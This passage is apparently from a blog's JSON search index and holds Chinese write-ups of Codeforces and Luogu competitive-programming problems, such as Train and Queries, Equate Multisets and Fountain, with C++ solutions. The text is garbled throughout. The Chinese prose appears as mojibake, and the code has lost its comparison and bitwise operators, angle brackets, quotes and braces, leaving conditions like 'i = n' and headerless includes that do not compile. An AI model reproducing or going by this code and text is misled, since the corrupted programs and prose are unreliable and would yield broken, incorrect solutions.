å…¥åˆ°ä¼˜å…ˆé˜Ÿåˆ—ä¸­ int k = num[j].id; if (!a[k]) q.push (n,k); else q.push (k / a[k],k); ++j; ans[q.top ().second] = i;//å–æœ€å°çš„å³ç«¯ç‚¹çš„ç¼–å·ï¼Œè¿›è¡Œç­”æ¡ˆçš„æ›´æ–° q.pop (); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1702C Train and Queries","path":"/2022/07/12/CF1702C/","content":"è‹¥å¹²ä¸ªè½¦ç«™è¢«åœé è‹¥å¹²æ¬¡ï¼Œç¬¬ $i$ æ¬¡åœé çš„ç«™ç‚¹ä¸º $j$ï¼Œè®¾ $\\forall j \\in n$ï¼Œç«™ç‚¹ $j$ è¢«åœé æ‰€å¯¹åº”çš„é›†åˆä¸º $ {C_i}$ã€‚åˆ™å®¹æ˜“æƒ³åˆ°ï¼Œå¯¹äºæ¯ç»„è¯¢é—®çš„ $x,y$ï¼Œè‹¥æˆç«‹åˆ™ä¸€å®šæ»¡è¶³ $\\min \\{C_x\\} \\max \\{C_y\\}$ã€‚ å‘ç°æ•°æ®èŒƒå›´ä¸­ $u_i$ è¾ƒå¤§ï¼Œä½†æ˜¯ $n$ è¾ƒå°ï¼Œè€ƒè™‘ä½¿ç”¨ map int,int p1,p2 æ¥å­˜å‚¨æ¯ä¸ªç«™ç‚¹çš„æœ€å°ï¼Œæœ€å¤§åœé ç¼–å·ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸º unodered_map çš„ä¸ç¨³å®šæ€§ï¼Œä¸è¦å»ä½¿ç”¨å®ƒï¼Œå¯èƒ½ä¼šå¯¼è‡´è¶…æ—¶ã€‚ï¼ˆå¥½åƒå¾ˆå¤šäººå› ä¸ºè¿™ä¸ªï¼Œèµ›åè¢« hack ç–¯äº†ï¼‰ äºæ˜¯ï¼Œåœ¨è¯¢é—®çš„æ—¶å€™ï¼Œåªè¦è¿™ä¸¤ä¸ªç«™ç‚¹è¢«åœé è¿‡å¹¶ä¸”æ»¡è¶³ $\\min \\{C_x\\} \\max \\{C_y\\}$ï¼Œå°±è¾“å‡º YESï¼Œå¦åˆ™ä¸º NOã€‚ä¸Šä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include map #include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,k,a[MAX];map int,int p1,p2;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();k = read (); p1.clear ();p2.clear ();//å¤šæµ‹ä¸€å®šè¦è®°å¾—æ¸…ç©ºï¼ï¼ï¼ for (int i = 1;i = n;++i) a[i] = read (); p1[a[i]] = (!p1[a[i]]) ? i : min (p1[a[i]],i); p2[a[i]] = (!p2[a[i]]) ? i : max (p2[a[i]],i);//ä¸€ä¸ªå­˜æœ€å¤§å€¼ï¼Œå¦ä¸€ä¸ªå­˜æœ€å°å€¼ for (int i = 1;i = k;++i) int x = read (),y = read (); if (p1[x] != 0 p1[y] != 0 p1[x] p2[y]) printf (YES );//æœ‰è§£çš„ä¸¤ä¸ªæƒ…å†µéƒ½è¦ç¬¦åˆ else printf (NO ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1702F Equate Multisets","path":"/2022/07/12/CF1702F/","content":"å¯¹äºä¸€ä¸ª $a_i$ è‹¥å¯ä»¥è¡¨ç¤ºæˆ $k \\times 2^p$ çš„å½¢å¼ï¼Œé‚£ä¸€å®šå¯ä»¥ç”± $k$ è¿›è¡Œè‹¥å¹²æ¬¡ç¬¬ä¸€ä¸ªä¹˜ $2$ çš„æ“ä½œå¾—åˆ°ã€‚æ‰€ä»¥æˆ‘ä»¬å°†æ‰€æœ‰çš„ $a_i$ é¢„å¤„ç†ï¼Œä½¿å…¶å˜æˆå¥‡æ•°ã€‚ç„¶åä½¿ç”¨ map int,int p ç»Ÿè®¡ $a_i$ çš„åˆ†å¸ƒï¼Œ$p_i$ çš„å€¼å°±ç›¸å½“äºå¤„ç† $b$ åè¯¥æ•°éœ€è¦å‡ºç°çš„æ¬¡æ•°ã€‚ å¯¹äºæ¯ä¸€ä¸ª $b_i$ï¼Œè‹¥ $p_{b_i}$ å¤§äº $0$ï¼Œé‚£ä¹ˆå°±è¯´æ˜ $b_i$ å¯ä»¥å˜æˆæŸä¸ª $a_j$ã€‚å› æ­¤å°† $p_{b_i} - 1$ ä»¥ä½œæ›´æ–°ï¼›å¦åˆ™å°† $b_i$ é™¤ä»¥ $2$ åå‘ä¸‹å–æ•´ï¼Œç›´è‡³ä¸º $0$ã€‚æœ€ååªè¦æ›´æ–°çš„æ¬¡æ•°ä¸º $n$ï¼Œå°±è¯´æ˜æ¯ä¸€ä¸ª $b_i$ éƒ½èƒ½åˆ†åˆ«å¯¹åº”ä¸€ä¸ªä¸åŒçš„ $a_j$ï¼Œæ­¤æ—¶ç­”æ¡ˆä¸º YESã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,cnt,a[MAX],b[MAX]; map int,int p;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); cnt = n; p.clear ();//å¤šæµ‹è¦æ¸…ç©ºï¼ï¼ï¼ for (int i = 1;i = n;++i) a[i] = read (); while (a[i] % 2 == 0) a[i] /= 2;//å¤„ç† a_i ++p[a[i]];//å­˜å…¥ map ä¸­ for (int i = 1;i = n;++i) int x = read (); while (x) if (p[x])//åªè¦å­˜åœ¨å°±æ›´æ–° --p[x],--cnt; break; x /= 2;//ä¸æ–­é™¤ä»¥ 2 ç›´åˆ°å˜ä¸º 0 if (!cnt) printf (YES );//å¤„ç†äº† n æ¬¡ä½¿å¾— cnt å˜ä¸º 0 else printf (NO ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1687A The Enchanted Forest","path":"/2022/06/05/CF1687A/","content":"ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸€ä¸ª $\\texttt{dp}$ï¼Œä»”ç»†ä¸€çœ‹å‘ç°åªæ˜¯ä¸€ä¸ªæ™®é€šçš„è´ªå¿ƒã€‚ è‹¥ $k \\le n$ï¼Œåˆ™ä¸èƒ½æ”¶é›†å®Œæˆ–æ°å¥½æ”¶é›†å®Œæ‰€æœ‰çš„è˜‘è‡ã€‚å¦‚æœä¸€ä¸ªåœ°æ–¹çš„è˜‘è‡è¢«é‡å¤åœ°æ”¶å–ï¼Œåˆ™ä¼šæµªè´¹ä¹‹å‰åˆ°è¾¾è¯¥åœ°æ‰€èŠ±çš„æ—¶é—´ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä½¿å¾—æ—¶é—´ä¹‹å’Œæœ€å¤§ï¼Œæ•…ä¸€ä¸ªåœ°æ–¹é‡å¤éå†ä¸å¯å–ã€‚å°è¯•æ¨¡æ‹Ÿåå¯ä»¥å‘ç°ï¼Œå¯¹äºæ–°é•¿å‡ºæ¥çš„è˜‘è‡ï¼Œæ”¶é›†çš„æ•°ç›®æ˜¯ç¡®å®šçš„ï¼Œä¸º $\\sum_{i = 1}^{k - 1}$ï¼Œè¿ç”¨é«˜æ–¯æ±‚å’Œå…¬å¼åå¾—åˆ° $\\dfrac{k \\times (k - 1)}{2}$ã€‚ç°åœ¨é—®é¢˜å°±è½¬æ¢ä¸ºæ±‚åŸæœ‰è˜‘è‡åºåˆ—çš„é•¿åº¦ä¸º $k$ çš„åŒºé—´å’Œçš„æœ€å¤§å€¼ï¼Œå› æ­¤åªéœ€è¦ç±»ä¼¼æ»‘åŠ¨çª—å£èˆ¬çš„æ€æƒ³æ‰«ä¸€éæ±‚å‡ºæœ€å¤§å€¼ã€‚ è‹¥ $k n$ï¼Œåˆ™å¯ä»¥æ”¶é›†å®ŒåŸæœ‰çš„æ‰€æœ‰çš„è˜‘è‡ï¼ˆç”±äºæ¯æ¬¡åªé•¿ä¸€ä¸ªè˜‘è‡ï¼Œåˆå§‹ä½ç½®çš„è˜‘è‡æ•°é‡å¤§äºç­‰äº $1$ï¼Œæ‰€ä»¥æ”¶é›†åŸæœ‰çš„æ‰€æœ‰è˜‘è‡è‡³å°‘ä¸æ¯”ä¸å…¨æ”¶åŠ£ï¼‰ï¼Œå¯¹äºå¦‚ä½•æ±‚å‡ºæ–°é•¿å‡ºçš„è˜‘è‡çš„æœ€å€¼çš„åºåˆ—çš„é—®é¢˜ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯é€†å‘è€ƒè™‘ã€‚ç”±äºæ”¶é›†å®ŒåŸæœ‰çš„æ‰€æœ‰çš„è˜‘è‡ï¼Œæ‰€ä»¥æ¯ä¸ªèŠ‚ç‚¹è‡³å°‘åˆ°ä¸€æ¬¡ï¼Œä»¤æœ€åä¸€æ¬¡æ‰€åˆ°è¾¾çš„èŠ‚ç‚¹ä¸º $n$ï¼Œå€’æ•°ç¬¬äºŒä¸ªåˆ°è¾¾çš„ç‚¹ä¸º $n - 1$ï¼Œä»¥æ­¤ç±»æ¨â€¦â€¦é‚£ä¹ˆå¯ä»¥å‘ç°ï¼Œ$n$ ç‚¹æœ€åç”Ÿé•¿çš„ä¸€ä¸ªè˜‘è‡æ²¡ç”¨èƒ½å¤Ÿé‡‡é›†ï¼Œ$n - 1$ ç‚¹æœ‰ä¸¤ä¸ªï¼Œä¸€æ¬¡ç±»æ¨â€¦â€¦æ‰€ä»¥è¯´ï¼Œåœ¨ $k$ ç§’åï¼Œå…±æ–°é•¿å‡ºäº† $n \\times k$ ä¸ªè˜‘è‡ï¼Œè€ŒèŠ‚ç‚¹ $n$ è‡³ $1$ åˆ†åˆ«æœ‰ $1,2,\\cdots,n$ ä¸ªè˜‘è‡æœªé‡‡é›†ï¼Œå³æ€»å…±é‡‡é›†åˆ°çš„æ–°é•¿å‡ºçš„è˜‘è‡æ•°é‡ä¸º $n \\times k - \\sum_{i = 1}^{n} = n \\times t - \\frac{(n + 1) \\times n}{2}$ã€‚ æ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ï¼Œå¯ä»¥é€šè¿‡æœ¬é¢˜ã€‚æœ€åï¼Œåƒåƒä¸‡ä¸‡æ³¨æ„å¼€ $\\texttt{long long}$ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t;ll k,n,ans,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) ans = 0; n = read ();k = read (); for (int i = 1;i = n;++i) a[i] = read (); if (k = n) ll s = 0; for (int i = 1;i = n;++i) if (i = k) s += a[i],ans = s; else ans = max (ans,s - a[i - k] + a[i]),s = s - a[i - k] + a[i]; ans += k * (k - 1) 1; else for (int i = 1;i = n;++i) ans += a[i]; ans += n * k; ans -= n * (n + 1) 1; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1688A Cirno's Perfect Bitmasks Classroom","path":"/2022/06/05/CF1688A/","content":"é¦–å…ˆæš´åŠ›è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå¯¹äºä¸€ä¸ª $x=2^k$ çš„æ•°ä¸€å®šä¼šè¢«å¡åˆ°è¶…æ—¶ã€‚ ç”±äºé¢˜ç›®å¯»æ‰¾æœ€å°çš„æ•° $y$ ç¬¦åˆ $x \\ y 0$ ä¸” $x \\oplus y 0$ï¼Œä¸éš¾æƒ³åˆ°å…ˆç”¨ $\\mathrm{lowbit}$ æ‰¾åˆ°ç¬¦åˆ $x \\oplus y 0$ çš„ $y$ã€‚å‘ç°åªè¦ $x eq y$ï¼Œæ˜¾ç„¶ä¹Ÿæ»¡è¶³å‰è€…çš„æ¡ä»¶ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“ $x = 1$ æ—¶çš„ç­”æ¡ˆæ¯”è¾ƒç‰¹æ®Šï¼Œå› æ­¤ç‰¹åˆ¤å³å¯ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬åˆ†ä¸ºä¸‰ç±»è€ƒè™‘ï¼Œå¾—åˆ°æœ€ç»ˆçš„ä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,m;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); if (n == 1) printf (3 ); continue; m = n (-n); if (m == n) ++m; printf (%d ,m); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1688B Patchouli's Magical Talisman","path":"/2022/06/05/CF1688B/","content":"å¯¹äºä¸€ä¸ªå¥‡æ•°ï¼Œä¸éœ€è¦è¿›è¡Œæ“ä½œï¼›å¯¹äºä¸€ä¸ªå¶æ•°ï¼Œåªè¦æœ‰å¥‡æ•°å­˜åœ¨ï¼Œæ˜¾ç„¶ç›´æ¥ä¸å¥‡æ•°åˆå¹¶æœ€ä¼˜ã€‚å› æ­¤ï¼Œè‹¥åºåˆ—ä¸­å­˜åœ¨å¥‡æ•°ï¼Œåˆ™ç”±å¥‡æ•°+å¶æ•°=å¥‡æ•°çš„æ€§è´¨ï¼Œå¯ä»¥å°†æ‰€æœ‰çš„å¶æ•°ä¸å…¶åˆå¹¶ï¼›è‹¥ä¸å­˜åœ¨å¥‡æ•°ï¼Œåˆ™æ‰¾åˆ°å¤„ç†æœ€å°‘æ¬¡æ•°åèƒ½å˜ä¸ºå¥‡æ•°çš„å¶æ•°ï¼Œè¿›è¡Œæ“ä½œï¼Œç„¶åå°†å‰©ä½™çš„å¶æ•°ä¸å…¶åˆå¹¶ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,mx,cnt,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();cnt = 0;mx = INF; for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (a[i] 1) ++cnt; for (int i = 1;i = n;++i) if (a[i] 1) continue; int p = 0; while (a[i] % 2 == 0) a[i] /= 2; ++p; mx = min (mx,p); if (cnt == n) printf (0 ); else if (!cnt) printf (%d ,n - 1 + mx); else printf (%d ,n - cnt); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7167 [eJOI 2020 Day1] Fountain","path":"/2022/04/25/P7167/","content":"è§‚å¯Ÿæœ¬é¢˜é¢˜å¹²ï¼Œå‘ç°åˆ¶çº¦æ°´æœ€ç»ˆçš„å»å¤„çš„ä¸ºç›˜å­çš„ç›´å¾„ä¸å®¹é‡ã€‚è‹¥å¯¹äºæ¯æ¬¡è¯¢é—®ï¼Œéƒ½ç›´æ¥æš´åŠ›è®¡ç®—ï¼Œæ˜¾ç„¶ä¼šè¶…æ—¶ã€‚äºæ˜¯æƒ³åˆ°ä¸€ç§èƒ½å¤Ÿå‡å°‘åˆ¤æ–­æ¬¡æ•°ï¼Œåˆä¸å½±å“ç»“æœçš„æ–¹æ³•â€”å€å¢ã€‚ é¦–å…ˆé¢„å¤„ç†å‡ºä»ç¬¬ $i$ ä¸ªåœ†ç›˜å¼€å§‹è¿ç»­ $2^j$ ä¸ªåœ†ç›˜ä¸­çš„æœ€å¤§ç›´å¾„ï¼Œè®°ä¸º $pre_{i,j}$ã€‚æ˜¾ç„¶ $\\forall i \\in [1,n],pre_{i,0} = d_i$ã€‚ç„¶åå°±æ˜¯å€å¢æ±‚æœ€å€¼çš„è¿‡ç¨‹ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚ç„¶åç»™å‡º $f_{i,j},g_{i,j}$ï¼Œåˆ†åˆ«è¡¨ç¤ºä» $i$ å¼€å§‹æ°´æº¢å‡º $2^j$ æ¬¡åæ‰€åˆ°è¾¾çš„åœ†ç›˜ä¸æ±‚æ°´æº¢å‡ºæ‰€åˆ°è¾¾çš„ $2^j$ ä¸ªåœ†ç›˜çš„å®¹é‡ä¹‹å’Œã€‚ ä½†æ˜¯ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæ¯æ¬¡éå†å»æ±‚ç¬¬ $i$ ä¸ªåœ†ç›˜å†åŠ å…¥æ°´åï¼Œæœ€ç»ˆèƒ½æµåˆ°çš„åœ†ç›˜ï¼Œä¼šé¢å¤–äº§ç”Ÿ $O(N)$ çš„å¤æ‚åº¦ï¼ŒåŠ ä¸Šå¯¹æ‰€æœ‰åœ†ç›˜çš„æ±‚è§£ä»¥åŠé¢„å¤„ç†åçš„æŸ¥è¯¢ï¼Œä¼šè¾¾åˆ° $O(N^2 \\log N)$ çš„å¤æ‚åº¦ï¼Œæ— æ³•é€šè¿‡æ­¤é¢˜ã€‚ä¸éš¾å‘ç°ï¼Œè¿™å…¶å®å­˜åœ¨å•è°ƒæ€§ï¼Œå› æ­¤ä½¿ç”¨äºŒåˆ†ç­”æ¡ˆå»æ±‚è§£ã€‚è®¾é¢„å¤„ç†çš„æŸ¥è¯¢å‡½æ•°ä¸º query (l,r)ï¼Œåˆ™æœ‰æ»¡è¶³ query(i + 1,(l + r) 1) = d[i] çš„æ—¶å€™æ›´æ–°å·¦ç«¯ç‚¹ä¸º l = ((l + r) 1) + 1ï¼Œå¦åˆ™ä¸º r = (l + r) 1ã€‚åœ¨å¾—åˆ°ç­”æ¡ˆ $l$ åï¼Œå°±å¯ä»¥æ ¹æ®å˜é‡è®¾ç½®çš„å«ä¹‰å»æ›´æ–° $f_{i,0},g_{i,0}$ï¼Œæœ‰ $f_{i,0} = l,g_{i,0} = c_{f_{i,0}}$ã€‚ ç”±äº $N_{\\max} = 10^5$ï¼Œæ‰€ä»¥æœ¬é¢˜è§£å°†ä¸¤ä¸ªæ•°ç»„è®¾ç½®ä¸º f[100005][20],g[100005][20]ã€‚åˆ™å¯¹äº $f_{i,j},g_{i,j}$ çš„è½¬ç§»æœ‰ï¼š for (int j = 1;j 20;++j) for (int i = 1;i = n;++i)//i~i + 2^j = i ~ 2^(j - 1) + (i + 2^(j - 1) + 1)~2^j f[i][j] = f[f[i][j - 1]][j - 1],g[i][j] = g[f[i][j - 1]][j - 1] + g[i][j - 1]; æœ€åå°±æ˜¯æ±‚è§£çš„éƒ¨åˆ†äº†ã€‚è€ƒè™‘åˆ°é¢˜ç›®å­˜åœ¨æµåˆ°æœ€ç»ˆçš„æ°´æ± çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†åŠ å…¥ä¸€ä¸ªå®¹ç§¯ä¸º $\\inf$ çš„åœ†ç›˜ã€‚å¯¹äºæ¯ä¸€ç»„çš„è¯¢é—®ï¼Œé¦–å…ˆåˆ¤æ–­æ°´èƒ½å¦æº¢å‡ºï¼Œè‹¥å¯ä»¥ï¼Œåˆ™åˆ©ç”¨å€å¢è¿›è¡Œå¤„ç†ç›´è‡³æ— æ³•æº¢å‡ºï¼Œæœ€åç‰¹åˆ¤åˆ°è¾¾åº•ç›˜çš„æƒ…å†µå³å¯ã€‚ æœ€ååˆ©ç”¨å€å¢çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,d[MAX],c[MAX];int pre[MAX][20],f[MAX][20],g[MAX][20];/*pre é¢„å¤„ç†æ±‚åŒºé—´æœ€å€¼ f æ±‚ä» i å¼€å§‹æ°´æº¢å‡º 2^j æ¬¡åæ‰€åˆ°è¾¾çš„åœ†ç›˜g æ±‚æ°´æº¢å‡ºæ‰€åˆ°è¾¾çš„ 2^j ä¸ªåœ†ç›˜çš„å®¹é‡ä¹‹å’Œ */ int query (int x,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) d[i] = read (),c[i] = read (); for (int i = 1;i = n;++i) pre[i][0] = d[i];//åˆå§‹åŒ– for (int j = 1;(1 j) = n;++j)//å€å¢æ±‚åŒºé—´æœ€å€¼ for (int i = 1;i + (1 j) - 1 = n;++i) pre[i][j] = max (pre[i][j - 1],pre[i + (1 (j - 1))][j - 1]); c[n + 1] = INF;f[n][0] = n + 1;g[n][0] = c[f[n][0]];//åŠ å…¥ä¸€ä¸ªè¶…å¤§å®¹ç§¯çš„åº•ç›˜ for (int i = 1;i n;++i) int l = i + 1,r = n + 1; while (l r)//äºŒåˆ†æ±‚ä¼šæµå…¥ä½•å¤„ int mid = (l + r) 1; if (query (i + 1,mid) = d[i]) l = mid + 1;//log çš„æŸ¥è¯¢ else r = mid; f[i][0] = l; g[i][0] = c[f[i][0]];//åˆå§‹åŒ– for (int j = 1;j 20;++j) for (int i = 1;i = n;++i) f[i][j] = f[f[i][j - 1]][j - 1],g[i][j] = g[f[i][j - 1]][j - 1] + g[i][j - 1]; for (int i = 1;i = m;++i) int x = read (),y = read (); if (y c[x]) y -= c[x]; for (int j = 19;j = 0;--j) if (y g[x][j]) y -= g[x][j],x = f[x][j]; x = f[x][0];//æ³¨æ„åˆ«å¿˜äº†å‡å»ä¸€å¼€å§‹æº¢å‡ºçš„é‚£ä¸€æ¬¡ printf (%d ,x == (n + 1) ? 0 : x);//ç‰¹åˆ¤ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int query (int x,int y) int k = (int) log2 (y - x + 1); return max (pre[x][k],pre[y - (1 k) + 1][k]);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6883 [COCI2016-2017#3] KroniÄan","path":"/2022/04/07/P6883/","content":"çœ‹åˆ° $1 \\le N,K \\le 20$ çš„æ•°æ®èŒƒå›´ï¼Œä¸éš¾æƒ³åˆ°çŠ¶æ€å‹ç¼© $\\texttt{dp}$ã€‚è®¾ dp[i] è¡¨ç¤ºæ‰€æœ‰ç»ç’ƒæ¯çš„çŠ¶æ€ä¸º $i$ æ—¶çš„æœ€å°èŠ±è´¹ã€‚ ç”±äºæ˜¯æœ€å°èŠ±è´¹ï¼Œåˆå§‹åŒ–æ—¶ä¼šå°†æ‰€æœ‰çš„ dp[i] é»˜è®¤ä¸º INFï¼Œç„¶åå†ç‰¹æ®Šå¤„ç† dp[0] çš„å€¼ã€‚é‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªé—®é¢˜â€”å¯¹äºçŠ¶æ€ $i$ çš„ç¬¬ $j$ ä½ï¼Œä»€ä¹ˆæ—¶å€™è¡¨ç¤ºæœ‰æ°´å‘¢ï¼Ÿæ ¹æ®å¸ƒå°”å˜é‡çš„æ€æƒ³ï¼Œå®¹æ˜“å…ˆå…¥ä¸ºä¸»çš„å°†æœ‰æ°´æ—¶çš„çŠ¶æ€è®¾ä¸º $1$ã€‚ä½†æ˜¯éœ€è¦æ€è€ƒçš„æ˜¯ï¼Œå€˜è‹¥æ­¤æ—¶å°† dp[0] = 0ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºæ‰€æœ‰çš„æ°´æ¯ï¼ˆå†åŠ ä¸Šå¼•å…¥çš„ç¼–å·ä¸º $0$ çš„æ°´æ¯ï¼‰å‡æ— æ°´æ—¶æœ€å°èŠ±è´¹ä¸º $0$ã€‚è¿™æ ·æ—¢ä¸é¢˜é¢ä¸­çš„æ‰€æœ‰çš„æ°´æ¯åˆå§‹å‡è£…æœ‰ä¸€å®šçš„æ°´çŸ›ç›¾ï¼Œåœ¨è®¡ç®—æ—¶åˆæ— æ³•é€šè¿‡ dp[0] çš„å€¼å»è½¬ç§»ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¾¿å°†çŠ¶æ€ $i$ çš„ç¬¬ $j$ ä½æœ‰æ°´æ—¶è®¾ä¸º $0$ã€‚ çŠ¶æ€è½¬ç§»è¿˜æ˜¯æ¯”è¾ƒæ˜¾ç„¶çš„ï¼Œå€˜è‹¥ $j$ æ¯ä¸­æœ‰æ°´ï¼Œé‚£ä¹ˆå¯ä»¥å°†æ¯ä¸­çš„æ°´å€’å…¥ $k$ ä¸­ã€‚è¿™é‡Œåˆæœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œæšä¸¾çŠ¶æ€çš„ $i$ å»è¡¨ç¤ºè½¬ç§»å‰è¿˜æ˜¯è½¬ç§»åå‘¢ï¼Ÿæˆ‘ä»¬å†å°†é—®é¢˜çš„æœ¬è´¨èšç„¦åˆ°çŠ¶æ€çš„å«ä¹‰çš„è®¾ç½®ä¸Šï¼Œç”±äº $0$ è¡¨ç¤ºæœ‰æ°´ï¼Œæ‰€ä»¥å½“ $i$ è¡¨ç¤ºè½¬ç§»å‰æ—¶ï¼Œæ¯”è¾ƒéš¾å»å¤„ç†è½¬ç§»åçš„çŠ¶æ€ï¼ˆåŸæ¥æŸä¸€ä½çš„ $1$ å°†æ ‡è®°ä¸º $0$ï¼Œè€Œè‹¥æ˜¯ $0$ åˆ™ä¸éœ€è¦æ”¹å˜ï¼‰ï¼Œå› æ­¤æœ¬é¢˜è§£é€‰æ‹©æ¯”è¾ƒå®¹æ˜“çš„è¡¨ç¤ºè½¬ç§»åçš„çŠ¶æ€çš„æ–¹æ³•ã€‚æ€»ç»“ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æ»¡è¶³ i (1 j) == 0 ä¸” i (1 k) == 0 æ—¶ï¼Œè¿›è¡Œå¦‚ä¸‹è½¬ç§»ï¼šdp[i] = min (dp[i],dp[i ^ (1 j)] + a[j][k])ã€‚ æœ€ååœ¨ç»Ÿè®¡ç­”æ¡ˆæ—¶ï¼Œç”±äºçŠ¶æ€è®¾ç½®çš„ç‰¹æ®Šæ€§ï¼Œéœ€è¦ç»Ÿè®¡æ¯ä¸€çŠ¶æ€ä¸‹ $0$ çš„ä¸ªæ•°ï¼Œè‹¥å°äºç­‰äº $k$ï¼Œåˆ™è¿›è¡Œç­”æ¡ˆçš„æ›´æ–°ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 20;const int MOD = 1e9 + 7;inline int read ();int n,k,ans = INF,a[MAX][MAX],dp[1 20]; int count (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();k = read (); for (int i = 0;i n;++i) for (int j = 0;j n;++j) a[i][j] = read (); init (dp); dp[0] = 0;//åˆå§‹åŒ– for (int i = 1;i (1 n);++i) for (int j = 0;j n;++j) if (!(i (1 j))) continue; for (int k = 0;k n;++k) if (!(i (1 k)))//ç¬¦åˆæ¡ä»¶å³è¿›è¡Œè½¬ç§» dp[i] = min (dp[i],dp[i ^ (1 j)] + a[j][k]); for (int i = 1;i (1 n);++i) if (count (i) = k) ans = min (ans,dp[i]); printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int count (int x) int cnt = 0; while (x) x = (x - 1); ++cnt; return n - cnt;//æ€»ä½æ•°å‡å» 0 çš„ä¸ªæ•° 